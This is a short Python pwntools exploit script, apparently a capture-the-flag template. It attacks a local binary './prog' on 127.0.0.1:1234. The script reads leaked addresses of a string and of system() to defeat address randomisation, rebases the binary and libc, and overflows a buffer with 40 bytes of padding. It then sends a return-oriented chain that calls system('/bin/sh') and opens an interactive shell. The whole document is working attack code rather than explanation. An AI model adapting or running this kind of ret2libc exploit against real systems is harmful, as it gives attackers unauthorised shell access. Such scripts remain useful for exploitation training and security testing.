#!/usr/bin/python

from pwn import *

context.arch = 'amd64'
program_name = "./prog"

binary = elf.ELF(program_name)
local = False
libc = binary.libc 
conn = process(program_name)

if not local:
	conn.close()
	conn = remote("127.0.0.1", 1234)
	libc = elf.ELF("./libc.so.6")


# do some leaking
conn.recvuntil(" LEAKS ")
addr_secret = int(conn.recvuntil("\n"), 16)
addr_system = int(conn.recvuntil("\n"), 16)
print "[+] System: " + hex(addr_system)


# update our elfs from the leaks
binary.address = addr_secret - list(binary.search(" the leaked string points here"))[0]
libc.address = addr_system - libc.symbols["system"]


padding = "A"*5*8 # num padding
rop = ROP(libc)
rop.system(list(libc.search("/bin/sh\x00"))[0])
conn.sendline(padding + str(rop))
conn.interactive()
